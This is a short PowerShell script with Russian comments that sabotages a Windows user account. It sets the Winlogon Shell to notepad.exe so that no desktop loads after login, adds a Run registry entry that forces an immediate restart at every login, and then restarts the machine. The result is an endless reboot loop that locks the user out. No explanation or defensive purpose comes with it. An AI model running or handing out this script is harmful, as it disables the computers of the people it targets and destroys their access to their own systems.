# Очищаем Shell - после входа в систему не будет рабочего стола
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Shell" "notepad.exe"

# Добавляем автозапуск на мгновенный ребут
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AutoReboot" -Value "shutdown /r /t 0"
shutdown /r /t 0
